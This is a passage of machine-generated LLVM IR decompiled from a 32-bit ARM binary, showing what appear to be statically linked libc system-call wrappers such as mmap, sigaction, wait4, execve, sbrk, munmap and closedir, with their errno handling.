  uselistorder label %dec_label_pc_18374, { 2, 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_18318, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18390 = load i32, i32* @r4, align 4
  store i32 %v3_18390, i32* %stack_var_-16, align 4
  %v3_1839c = urem i32 %arg3, 4096
  %v2_183a0 = icmp eq i32 %v3_1839c, 0
  br i1 %v2_183a0, label %dec_label_pc_183bc, label %dec_label_pc_183a8

dec_label_pc_183a8:                               ; preds = %entry
  %v0_183a8 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_183b4 = inttoptr i32 %v0_183a8 to i32*
  store i32 22, i32* %v2_183b4, align 4
  %v0_183ec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_183ec

dec_label_pc_183bc:                               ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_183e8, label %dec_label_pc_183d8

dec_label_pc_183d8:                               ; preds = %dec_label_pc_183bc
  %v0_183d8 = call i32 @__GI___errno_location()
  %v0_183dc = load i32, i32* %r4.global-to-local, align 4
  %v1_183dc = sub i32 0, %v0_183dc
  %v2_183e0 = inttoptr i32 %v0_183d8 to i32*
  store i32 %v1_183dc, i32* %v2_183e0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_183e8

dec_label_pc_183e8:                               ; preds = %dec_label_pc_183bc, %dec_label_pc_183d8
  %v0_183e8 = phi i32 [ %arg1, %dec_label_pc_183bc ], [ -1, %dec_label_pc_183d8 ]
  store i32 %v0_183e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_183ec

dec_label_pc_183ec:                               ; preds = %dec_label_pc_183a8, %dec_label_pc_183e8
  %v0_183ec = phi i32 [ %v0_183ec.pre, %dec_label_pc_183a8 ], [ %v0_183e8, %dec_label_pc_183e8 ]
  %v2_183f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_183f0, i32* @r4, align 4
  ret i32 %v0_183ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_183ec, { 1, 0 }
  uselistorder label %dec_label_pc_183e8, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_183f8 = load i32, i32* @r4, align 4
  store i32 %v3_183f8, i32* %stack_var_-8, align 4
  %v0_183fc = load i32, i32* @r0, align 4
  %v0_18400 = call i32 @__GI___errno_location()
  %v1_18404 = sub i32 0, %v0_183fc
  %v2_18408 = inttoptr i32 %v0_18400 to i32*
  store i32 %v1_18404, i32* %v2_18408, align 4
  %v2_18410 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18410, i32* @r4, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_18418 = load i32, i32* @r4, align 4
  %v6_18418 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_18420 = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_18420, label %dec_label_pc_18474, label %dec_label_pc_18438

dec_label_pc_18438:                               ; preds = %entry
  %v1_18438 = add i32 %arg2, 4
  %v2_18438 = inttoptr i32 %v1_18438 to i32*
  %v3_18438 = load i32, i32* %v2_18438, align 4
  store i32 %v3_18438, i32* @r3, align 4
  %v1_1843c = and i32 %v3_18438, 67108864
  %v2_1843c = icmp eq i32 %v1_1843c, 0
  br i1 %v2_1843c, label %dec_label_pc_18444, label %dec_label_pc_18474

dec_label_pc_18444:                               ; preds = %dec_label_pc_18438
  store i32 20, i32* @r2, align 4
  %v2_18448 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_18448, i32* @r0, align 4
  %v0_1844c = call i32 @memcpy()
  store i32 %v2_18448, i32* @ip, align 4
  %v0_18474.pre = load i32, i32* @r5, align 4
  %v0_1847c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18474

dec_label_pc_18474:                               ; preds = %dec_label_pc_18438, %entry, %dec_label_pc_18444
  %v0_1847c = phi i32 [ %arg3, %dec_label_pc_18438 ], [ %arg3, %entry ], [ %v0_1847c.pre, %dec_label_pc_18444 ]
  %v0_18478 = phi i32 [ %arg2, %dec_label_pc_18438 ], [ 0, %entry ], [ %v2_18448, %dec_label_pc_18444 ]
  %v0_18474 = phi i32 [ %arg1, %dec_label_pc_18438 ], [ %arg1, %entry ], [ %v0_18474.pre, %dec_label_pc_18444 ]
  %v4_18484 = call i32 @__syscall_rt_sigaction(i32 %v0_18474, i32 %v0_18478, i32 %v0_1847c, i32 8)
  store i32 %v3_18418, i32* @r4, align 4
  store i32 %v6_18418, i32* @r5, align 4
  ret i32 %v4_18484

; uselistorder directives
  uselistorder label %dec_label_pc_18474, { 2, 0, 1 }
}

define i32 @function_18498(i32 %arg1) local_unnamed_addr {
dec_label_pc_18498:
  %v0_18498 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18498, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18498
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18498, %bb
  %v0_184a0 = phi i32 [ %arg1, %dec_label_pc_18498 ], [ 0, %bb ]
  ret i32 %v0_184a0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_184b4 = load i32, i32* @r0, align 4
  ret i32 %v0_184b4
}

define i32 @wait4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_184b8 = load i32, i32* @r7, align 4
  store i32 %v3_184b8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_184e0, label %dec_label_pc_184d0

dec_label_pc_184d0:                               ; preds = %entry
  %v0_184d0 = call i32 @__GI___errno_location()
  %v0_184d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_184d4 = sub i32 0, %v0_184d4
  %v2_184d8 = inttoptr i32 %v0_184d0 to i32*
  store i32 %v1_184d4, i32* %v2_184d8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_184e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_184e0

dec_label_pc_184e0:                               ; preds = %entry, %dec_label_pc_184d0
  %v2_184e4 = phi i32 [ %v3_184b8, %entry ], [ %v2_184e4.pre, %dec_label_pc_184d0 ]
  %v0_184e0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_184d0 ]
  store i32 %v2_184e4, i32* @r7, align 4
  ret i32 %v0_184e0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_184e0, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_184ec = load i32, i32* @r7, align 4
  store i32 %v3_184ec, i32* %stack_var_-8, align 4
  %v0_184f8 = load i32, i32* @r0, align 4
  store i32 %v0_184f8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_184f8, -4095
  br i1 %tmp, label %dec_label_pc_18518, label %dec_label_pc_18508

dec_label_pc_18508:                               ; preds = %entry
  %v0_18508 = call i32 @__GI___errno_location()
  %v0_1850c = load i32, i32* %r7.global-to-local, align 4
  %v1_1850c = sub i32 0, %v0_1850c
  %v2_18510 = inttoptr i32 %v0_18508 to i32*
  store i32 %v1_1850c, i32* %v2_18510, align 4
  %v2_18518.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18518

dec_label_pc_18518:                               ; preds = %entry, %dec_label_pc_18508
  %v1_1851c = phi i32 [ %v0_184f8, %entry ], [ -1, %dec_label_pc_18508 ]
  %v2_18518 = phi i32 [ %v3_184ec, %entry ], [ %v2_18518.pre, %dec_label_pc_18508 ]
  store i32 %v2_18518, i32* %r7.global-to-local, align 4
  ret i32 %v1_1851c

; uselistorder directives
  uselistorder i32 %v0_184f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18518, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_18530 = load i32, i32* @r0, align 4
  ret i32 %v1_18530
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18534 = load i32, i32* @r7, align 4
  store i32 %v3_18534, i32* %stack_var_-8, align 4
  %v0_18540 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18540, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18540, -4095
  br i1 %tmp, label %dec_label_pc_18560, label %dec_label_pc_18550

dec_label_pc_18550:                               ; preds = %entry
  %v0_18550 = call i32 @__GI___errno_location()
  %v0_18554 = load i32, i32* %r7.global-to-local, align 4
  %v1_18554 = sub i32 0, %v0_18554
  %v2_18558 = inttoptr i32 %v0_18550 to i32*
  store i32 %v1_18554, i32* %v2_18558, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_18560.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18560

dec_label_pc_18560:                               ; preds = %entry, %dec_label_pc_18550
  %v1_18564 = phi i32 [ %v0_18540, %entry ], [ -1, %dec_label_pc_18550 ]
  %v2_18560 = phi i32 [ %v3_18534, %entry ], [ %v2_18560.pre, %dec_label_pc_18550 ]
  store i32 %v2_18560, i32* %r7.global-to-local, align 4
  ret i32 %v1_18564

; uselistorder directives
  uselistorder i32 %v0_18540, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18560, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18568 = load i32, i32* @r7, align 4
  store i32 %v3_18568, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18590, label %dec_label_pc_18580

dec_label_pc_18580:                               ; preds = %entry
  %v0_18580 = call i32 @__GI___errno_location()
  %v0_18584 = load i32, i32* %r7.global-to-local, align 4
  %v1_18584 = sub i32 0, %v0_18584
  %v2_18588 = inttoptr i32 %v0_18580 to i32*
  store i32 %v1_18584, i32* %v2_18588, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_18594.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18590

dec_label_pc_18590:                               ; preds = %entry, %dec_label_pc_18580
  %v2_18594 = phi i32 [ %v3_18568, %entry ], [ %v2_18594.pre, %dec_label_pc_18580 ]
  %v0_18590 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18580 ]
  store i32 %v2_18594, i32* @r7, align 4
  ret i32 %v0_18590

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18590, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_185ac = load i32, i32* @r0, align 4
  ret i32 %v1_185ac
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_185c0 = load i32, i32* @r0, align 4
  ret i32 %v1_185c0
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_185c4 = load i32, i32* @r4, align 4
  store i32 %v3_185c4, i32* %stack_var_-16, align 4
  store i32 26460, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r4.global-to-local, align 4
  %v4_185d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 26460) to i32*), align 4
  %v2_185d8 = icmp eq i32 %v4_185d4, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_185d8, label %dec_label_pc_185e4, label %dec_label_pc_185f4

dec_label_pc_185e4:                               ; preds = %entry
  %v1_185e8 = call i32 @__GI_brk(i32 0)
  %v1_185ec = icmp slt i32 %v1_185e8, 0
  br i1 %v1_185ec, label %dec_label_pc_18618, label %dec_label_pc_185f4thread-pre-split

dec_label_pc_185f4thread-pre-split:               ; preds = %dec_label_pc_185e4
  %v0_185f8.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_185f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_185f4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_185f4

dec_label_pc_185f4:                               ; preds = %dec_label_pc_185f4thread-pre-split, %entry
  %v1_185f4 = phi i32 [ %v1_185f4.pre, %dec_label_pc_185f4thread-pre-split ], [ 26460, %entry ]
  %v0_185f4 = phi i32 [ %v0_185f4.pre, %dec_label_pc_185f4thread-pre-split ], [ ptrtoint (i32* @global_var_2947c.811 to i32), %entry ]
  %v1_18608 = phi i32 [ %v0_185f8.pr, %dec_label_pc_185f4thread-pre-split ], [ %arg1, %entry ]
  %v2_185f4 = add i32 %v0_185f4, %v1_185f4
  %v3_185f4 = inttoptr i32 %v2_185f4 to i32*
  %v4_185f4 = load i32, i32* %v3_185f4, align 4
  %v2_185f8 = icmp eq i32 %v1_18608, 0
  store i32 %v4_185f4, i32* %r4.global-to-local, align 4
  br i1 %v2_185f8, label %dec_label_pc_1861c, label %dec_label_pc_18604

dec_label_pc_18604:                               ; preds = %dec_label_pc_185f4
  %v2_18608 = add i32 %v4_185f4, %v1_18608
  %v1_1860c = call i32 @__GI_brk(i32 %v2_18608)
  %v1_18610 = icmp slt i32 %v1_1860c, 0
  br i1 %v1_18610, label %dec_label_pc_18618, label %dec_label_pc_18604.dec_label_pc_1861c_crit_edge

dec_label_pc_18604.dec_label_pc_1861c_crit_edge:  ; preds = %dec_label_pc_18604
  %v0_1861c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1861c

dec_label_pc_18618:                               ; preds = %dec_label_pc_18604, %dec_label_pc_185e4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1861c

dec_label_pc_1861c:                               ; preds = %dec_label_pc_185f4, %dec_label_pc_18604.dec_label_pc_1861c_crit_edge, %dec_label_pc_18618
  %v0_1861c = phi i32 [ %v0_1861c.pre, %dec_label_pc_18604.dec_label_pc_1861c_crit_edge ], [ -1, %dec_label_pc_18618 ], [ %v4_185f4, %dec_label_pc_185f4 ]
  %v2_18620 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18620, i32* @r4, align 4
  ret i32 %v0_1861c

; uselistorder directives
  uselistorder i32 %v4_185f4, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1861c, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18640 = load i32, i32* @r0, align 4
  ret i32 %v1_18640
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18644 = load i32, i32* @r7, align 4
  store i32 %v3_18644, i32* %stack_var_-8, align 4
  %v0_18650 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18650, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18650, -4095
  br i1 %tmp, label %dec_label_pc_18670, label %dec_label_pc_18660

dec_label_pc_18660:                               ; preds = %entry
  %v0_18660 = call i32 @__GI___errno_location()
  %v0_18664 = load i32, i32* %r7.global-to-local, align 4
  %v1_18664 = sub i32 0, %v0_18664
  %v2_18668 = inttoptr i32 %v0_18660 to i32*
  store i32 %v1_18664, i32* %v2_18668, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_18670.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18670

dec_label_pc_18670:                               ; preds = %entry, %dec_label_pc_18660
  %v1_18674 = phi i32 [ %v0_18650, %entry ], [ -1, %dec_label_pc_18660 ]
  %v2_18670 = phi i32 [ %v3_18644, %entry ], [ %v2_18670.pre, %dec_label_pc_18660 ]
  store i32 %v2_18670, i32* @r7, align 4
  ret i32 %v1_18674

; uselistorder directives
  uselistorder i32 %v0_18650, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18670, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18678 = load i32, i32* @r7, align 4
  store i32 %v3_18678, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_186a0, label %dec_label_pc_18690

dec_label_pc_18690:                               ; preds = %entry
  %v0_18690 = call i32 @__GI___errno_location()
  %v0_18694 = load i32, i32* %r7.global-to-local, align 4
  %v1_18694 = sub i32 0, %v0_18694
  %v2_18698 = inttoptr i32 %v0_18690 to i32*
  store i32 %v1_18694, i32* %v2_18698, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_186a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_186a0

dec_label_pc_186a0:                               ; preds = %entry, %dec_label_pc_18690
  %v2_186a4 = phi i32 [ %v3_18678, %entry ], [ %v2_186a4.pre, %dec_label_pc_18690 ]
  %v0_186a0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18690 ]
  store i32 %v2_186a4, i32* @r7, align 4
  ret i32 %v0_186a0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_186a0, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_186e0, label %dec_label_pc_186d0

dec_label_pc_186d0:                               ; preds = %entry
  %v0_186d0 = call i32 @__GI___errno_location()
  %v0_186d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_186d4 = sub i32 0, %v0_186d4
  %v2_186d8 = inttoptr i32 %v0_186d0 to i32*
  store i32 %v1_186d4, i32* %v2_186d8, align 4
  br label %dec_label_pc_186e0

dec_label_pc_186e0:                               ; preds = %entry, %dec_label_pc_186d0
  %v1_186e8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_186d0 ]
  ret i32 %v1_186e8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_186e0, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_186ec = load i32, i32* @r7, align 4
  store i32 %v3_186ec, i32* %stack_var_-8, align 4
  %v0_186f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_186f8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_186f8, -4095
  br i1 %tmp, label %dec_label_pc_18718, label %dec_label_pc_18708

dec_label_pc_18708:                               ; preds = %entry
  %v0_18708 = call i32 @__GI___errno_location()
  %v0_1870c = load i32, i32* %r7.global-to-local, align 4
  %v1_1870c = sub i32 0, %v0_1870c
  %v2_18710 = inttoptr i32 %v0_18708 to i32*
  store i32 %v1_1870c, i32* %v2_18710, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_18718.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18718

dec_label_pc_18718:                               ; preds = %entry, %dec_label_pc_18708
  %v1_1871c = phi i32 [ %v0_186f8, %entry ], [ -1, %dec_label_pc_18708 ]
  %v2_18718 = phi i32 [ %v3_186ec, %entry ], [ %v2_18718.pre, %dec_label_pc_18708 ]
  store i32 %v2_18718, i32* @r7, align 4
  ret i32 %v1_1871c

; uselistorder directives
  uselistorder i32 %v0_186f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18718, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_18720 = load i32, i32* @r4, align 4
  store i32 %v3_18720, i32* %stack_var_-24, align 4
  %v2_18724 = load i32, i32* %arg1, align 4
  store i32 %v2_18724, i32* %r4.global-to-local, align 4
  %v3_1872c = icmp eq i32 %v2_18724, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r6, align 4
  br i1 %v3_1872c, label %dec_label_pc_18740, label %dec_label_pc_18754

dec_label_pc_18740:                               ; preds = %entry
  %v0_18740 = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_18748 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18748, i32* %r2.global-to-local, align 4
  %v2_1874c = inttoptr i32 %v0_18740 to i32*
  store i32 9, i32* %v2_1874c, align 4
  %v0_187f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_187f4

dec_label_pc_18754:                               ; preds = %entry
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_18758 = add i32 %tmp, 24
  store i32 %v1_18758, i32* %r4.global-to-local, align 4
  store i32 %v1_18758, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_1876c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1876c)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_18784 = load i32, i32* @r6, align 4
  %v2_18784 = add i32 %v0_18784, 16
  %v3_18784 = inttoptr i32 %v2_18784 to i32*
  %v4_18784 = load i32, i32* %v3_18784, align 4
  call void @__pseudo_branch(i32 %v4_18784)
  %v0_18790 = load i32, i32* @r7, align 4
  %v1_18790 = inttoptr i32 %v0_18790 to i32*
  %v2_18790 = load i32, i32* %v1_18790, align 4
  store i32 %v2_18790, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_187a0 = load i32, i32* @r8, align 4
  store i32 %v0_187a0, i32* %v1_18790, align 4
  %v0_187a4 = load i32, i32* @r6, align 4
  %v1_187a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_187a4 = add i32 %v1_187a4, %v0_187a4
  %v3_187a4 = inttoptr i32 %v2_187a4 to i32*
  %v4_187a4 = load i32, i32* %v3_187a4, align 4
  store i32 ptrtoint (i32* @global_var_187b0.1100 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_187a4)
  %v0_187b0 = load i32, i32* @r7, align 4
  %v1_187b0 = add i32 %v0_187b0, 12
  %v2_187b0 = inttoptr i32 %v1_187b0 to i32*
  %v3_187b0 = load i32, i32* %v2_187b0, align 4
  store i32 %v3_187b0, i32* @r0, align 4
  %v0_187b4 = call i32 @free()
  %v0_187b8 = load i32, i32* @r7, align 4
  store i32 %v0_187b8, i32* @r0, align 4
  %v0_187bc = call i32 @free()
  %v0_187c4 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_187c4, -4095
  br i1 %tmp11, label %dec_label_pc_187f0, label %dec_label_pc_187e0

dec_label_pc_187e0:                               ; preds = %dec_label_pc_18754
  %v0_187e0 = call i32 @__GI___errno_location()
  %v0_187e4 = load i32, i32* @r4, align 4
  %v1_187e4 = sub i32 0, %v0_187e4
  store i32 %v1_187e4, i32* %r3.global-to-local, align 4
  %v2_187e8 = inttoptr i32 %v0_187e0 to i32*
  store i32 %v1_187e4, i32* %v2_187e8, align 4
  %v0_187ec = load i32, i32* @r8, align 4
  br label %dec_label_pc_187f0

dec_label_pc_187f0:                               ; preds = %dec_label_pc_18754, %dec_label_pc_187e0
  %v0_187f0 = phi i32 [ %v0_187c4, %dec_label_pc_18754 ], [ %v0_187ec, %dec_label_pc_187e0 ]
  store i32 %v0_187f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_187f4

dec_label_pc_187f4:                               ; preds = %dec_label_pc_18740, %dec_label_pc_187f0
  %v0_187f4 = phi i32 [ %v0_187f4.pre, %dec_label_pc_18740 ], [ %v0_187f0, %dec_label_pc_187f0 ]
  %v2_187fc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_187fc, i32* %r4.global-to-local, align 4
  ret i32 %v0_187f4

; uselistorder directives
  uselistorder i32 %v0_187c4, { 1, 0 }
  uselistorder label %dec_label_pc_187f4, { 1, 0 }
  uselistorder label %dec_label_pc_187f0, { 1, 0 }
}

define i32 @function_18808(i32 %arg1) local_unnamed_addr {
dec_label_pc_18808:
  %v0_18808 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18808, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_18808
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18808, %bb
  %v10_18814 = phi i32 [ %arg1, %dec_label_pc_18808 ], [ 0, %bb ]
  ret i32 %v10_18814

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_18818 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_1882c = call i32 @malloc(i32 48)
  %v2_18834 = icmp eq i32 %v1_1882c, 0
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r6, align 4
  br i1 %v2_18834, label %bb, label %dec_label_pc_18844

bb:                                               ; preds = %entry
  br label %dec_label_pc_188d0

dec_label_pc_18844:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18848 = load i32, i32* @r4, align 4
  %v2_18848 = icmp ugt i32 %v0_18848, 511
  %v2_1884c = add i32 %v1_1882c, 4
  %v3_1884c = inttoptr i32 %v2_1884c to i32*
  store i32 0, i32* %v3_1884c, align 4
  %v0_18850 = load i32, i32* %r3.global-to-local, align 4
  %v2_18850 = add i32 %v1_1882c, 16
  %v3_18850 = inttoptr i32 %v2_18850 to i32*
  store i32 %v0_18850, i32* %v3_18850, align 4
  %v0_18854 = load i32, i32* %r3.global-to-local, align 4
  %v2_18854 = add i32 %v1_1882c, 8
  %v3_18854 = inttoptr i32 %v2_18854 to i32*
  store i32 %v0_18854, i32* %v3_18854, align 4
  br i1 %v2_18848, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_18844
  %v0_1885c2 = load i32, i32* @r4, align 4
  %v2_1885c3 = add i32 %v1_1882c, 20
  %v3_1885c4 = inttoptr i32 %v2_1885c3 to i32*
  store i32 %v0_1885c2, i32* %v3_1885c4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_18844
  %v1_18858 = load i32, i32* %r3.global-to-local, align 4
  %v2_18858 = add i32 %v1_18858, 512
  store i32 %v2_18858, i32* %r3.global-to-local, align 4
  %v0_1885c = load i32, i32* @r4, align 4
  %v2_1885c = add i32 %v1_1882c, 20
  %v3_1885c = inttoptr i32 %v2_1885c to i32*
  store i32 %v0_1885c, i32* %v3_1885c, align 4
  %v1_18860 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_18860, i32* %v3_1885c, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_1882c, i32* @r5, align 4
  %v0_18868 = load i32, i32* @r7, align 4
  %v2_18868 = inttoptr i32 %v1_1882c to i32*
  store i32 %v0_18868, i32* %v2_18868, align 4
  %v0_1886c = load i32, i32* @r5, align 4
